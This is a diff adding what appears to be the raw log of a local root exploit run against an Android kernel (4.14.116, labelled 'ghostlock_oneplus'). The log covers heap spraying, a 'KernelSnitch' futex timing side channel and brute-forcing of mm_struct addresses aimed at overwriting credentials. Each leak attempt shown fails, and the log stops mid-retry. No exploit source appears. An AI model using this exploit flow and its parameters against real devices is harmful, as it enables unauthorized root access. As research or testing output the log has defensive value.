@@ -1,0 +1,160 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800aebc9a8 alias=ffffffff82ebc9a8
+[32m[+] [0mstartup context pid=7934 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=7934 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=7934 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=7934 phys_offset=0000000080000000 kernel_phys_load=0000000000080000 delta=ffffffff80080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000080000000 delta=ffffffff80080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mUMH path: fops redirect (mode=4)...
+[33m[*] [0m[T+317ms] pre-UMH drain
+[33m[*] [0m=== fops redirect === target=0xffffffff8303e378 mode=4
+[33m[*] [0m[T+317ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007d2cdde0c8
+[33m[*] [0mpass1 slow candidates: 786
+[33m[*] [0m  0000006d2c47e4e8 t1=130 t2=65
+[33m[*] [0m  0000006d2c6995c0 t1=455 t2=325
+[33m[*] [0m  0000006d2c913990 t1=390 t2=390
+[33m[*] [0m  0000006d2c92da60 t1=65 t2=0
+[33m[*] [0m  0000006d2ca47330 t1=195 t2=0
+[33m[*] [0m  0000006d2cdef070 t1=520 t2=195
+[33m[*] [0m  0000006d2cfa2e08 t1=65 t2=0
+[33m[*] [0m  0000006d2d087530 t1=520 t2=260
+[33m[*] [0m  0000006d2d177cb0 t1=65 t2=0
+[33m[*] [0m  0000006d2d1d4f98 t1=455 t2=130
+[33m[*] [0m  0000006d2d1f2088 t1=325 t2=0
+[33m[*] [0m  0000006d2d2f88b8 t1=65 t2=195
+[33m[*] [0m  0000006d2d35cbd8 t1=520 t2=455
+[33m[*] [0m  0000006d2d3d8fb8 t1=195 t2=0
+[33m[*] [0m  0000006d2d67d4e0 t1=65 t2=0
+[33m[*] [0m  0000006d2d76ac48 t1=455 t2=195
+[33m[*] [0m  0000006d2da51380 t1=130 t2=130
+[33m[*] [0m  0000006d2daf68a8 t1=130 t2=0
+[33m[*] [0m  0000006d2dcc3710 t1=195 t2=390
+[33m[*] [0m  0000006d2dcdb7d0 t1=65 t2=0
+[33m[*] [0m  0000006d2ddb6ea8 t1=65 t2=0
+[33m[*] [0m  0000006d2de65420 t1=260 t2=0
+[33m[*] [0m  0000006d2e094598 t1=455 t2=455
+[33m[*] [0m  0000006d2e169c40 t1=65 t2=0
+[33m[*] [0m  0000006d2e492588 t1=520 t2=390
+[33m[*] [0m  0000006d2e506928 t1=843359 t2=0
+[33m[*] [0m  0000006d2e596da8 t1=455 t2=520
+[33m[*] [0m  0000006d2e62a248 t1=390 t2=390
+[33m[*] [0m  0000006d2e8161a8 t1=455 t2=390
+[33m[*] [0m  0000006d2ea181b8 t1=260 t2=0
+[33m[*] [0m  0000006d2ea49340 t1=195 t2=0
+[33m[*] [0mfound 15 collisisons
+[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 1/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007d2cdde0c8
+[33m[*] [0mpass1 slow candidates: 758
+[33m[*] [0m  0000006d2c47f4f0 t1=325 t2=390
+[33m[*] [0m  0000006d2c4965a8 t1=130 t2=0
+[33m[*] [0m  0000006d2c505920 t1=518359 t2=0
+[33m[*] [0m  0000006d2c563c10 t1=65 t2=195
+[33m[*] [0m  0000006d2c5c8f38 t1=455 t2=455
+[33m[*] [0m  0000006d2c892588 t1=65 t2=0
+[33m[*] [0m  0000006d2cb0b950 t1=455 t2=520
+[33m[*] [0m  0000006d2cd2ca58 t1=65 t2=0
+[33m[*] [0m  0000006d2ce5a3c8 t1=130 t2=0
+[33m[*] [0m  0000006d2d1159a0 t1=504362 t2=0
+[33m[*] [0m  0000006d2d1ed060 t1=455 t2=260
+[33m[*] [0m  0000006d2d3e8038 t1=455 t2=455
+[33m[*] [0m  0000006d2d505920 t1=455 t2=455
+[33m[*] [0m  0000006d2d6372b0 t1=390 t2=520
+[33m[*] [0m  0000006d2d711980 t1=65 t2=0
+[33m[*] [0m  0000006d2d7dcfd8 t1=390 t2=0
+[33m[*] [0m  0000006d2d83b2d0 t1=390 t2=390
+[33m[*] [0m  0000006d2d894598 t1=455 t2=520
+[33m[*] [0m  0000006d2d909940 t1=65 t2=260
+[33m[*] [0m  0000006d2d956ba8 t1=520 t2=390
+[33m[*] [0m  0000006d2da33290 t1=455 t2=520
+[33m[*] [0m  0000006d2dc0d160 t1=390 t2=520
+[33m[*] [0m  0000006d2dca2608 t1=455 t2=455
+[33m[*] [0m  0000006d2dd008f8 t1=520 t2=390
+[33m[*] [0m  0000006d2de2e268 t1=65 t2=0
+[33m[*] [0m  0000006d2de774b0 t1=260 t2=455
+[33m[*] [0m  0000006d2e0171b0 t1=455 t2=325
+[33m[*] [0m  0000006d2e139ac0 t1=260 t2=325
+[33m[*] [0m  0000006d2e249340 t1=390 t2=455
+[33m[*] [0m  0000006d2e2af670 t1=455 t2=390
+[33m[*] [0m  0000006d2e452388 t1=520 t2=520
+[33m[*] [0m  0000006d2e45d3e0 t1=65 t2=390
+[33m[*] [0m  0000006d2e4ad660 t1=504166 t2=0
+[33m[*] [0m  0000006d2e540af8 t1=504101 t2=0
+[33m[*] [0m  0000006d2e56dc60 t1=325 t2=390
+[33m[*] [0m  0000006d2e57bcd0 t1=130 t2=0
+[33m[*] [0m  0000006d2e68e568 t1=520 t2=520
+[33m[*] [0m  0000006d2e912988 t1=130 t2=0
+[33m[*] [0m  0000006d2e9b4e98 t1=130 t2=0
+[33m[*] [0m  0000006d2ebd0f78 t1=260 t2=455
+[33m[*] [0m  0000006d2ed31a80 t1=506314 t2=0
+[33m[*] [0mfound 15 collisisons
+[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 2/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007d2cdde0c8
+[33m[*] [0mpass1 slow candidates: 642
+[33m[*] [0m  0000006d2c461400 t1=130 t2=0
+[33m[*] [0m  0000006d2c4cd760 t1=65 t2=0
+[33m[*] [0m  0000006d2c62c258 t1=520 t2=390
+[33m[*] [0m  0000006d2c663410 t1=455 t2=0
+[33m[*] [0m  0000006d2c7b2e88 t1=65 t2=260
+[33m[*] [0m  0000006d2c9c8f38 t1=796549 t2=0
+[33m[*] [0m  0000006d2cab1680 t1=390 t2=260
+[33m[*] [0m  0000006d2cb51b80 t1=130 t2=0
+[33m[*] [0m  0000006d2cb5cbd8 t1=455 t2=325
+[33m[*] [0m  0000006d2cd03910 t1=520 t2=0
+[33m[*] [0m  0000006d2cd61c00 t1=390 t2=0
+[33m[*] [0m  0000006d2cf77cb0 t1=802213 t2=0
+[33m[*] [0m  0000006d2d1a5e20 t1=195 t2=0
+[33m[*] [0m  0000006d2d5b6ea8 t1=195 t2=325
+[33m[*] [0m  0000006d2d63d2e0 t1=455 t2=260
+[33m[*] [0m  0000006d2d75bbd0 t1=455 t2=0
+[33m[*] [0m  0000006d2d7e6028 t1=260 t2=390
+[33m[*] [0m  0000006d2d7ec058 t1=455 t2=325
+[33m[*] [0m  0000006d2d868438 t1=130 t2=0
+[33m[*] [0m  0000006d2dcbc6d8 t1=325 t2=195
+[33m[*] [0m  0000006d2dd22a08 t1=455 t2=455
+[33m[*] [0m  0000006d2ddfd0e0 t1=65 t2=0
+[33m[*] [0m  0000006d2df199c0 t1=669986 t2=0
+[33m[*] [0m  0000006d2df53b90 t1=520 t2=390
+[33m[*] [0m  0000006d2e223210 t1=520 t2=0
+[33m[*] [0m  0000006d2e2ed860 t1=667317 t2=0
+[33m[*] [0mfound 15 collisisons
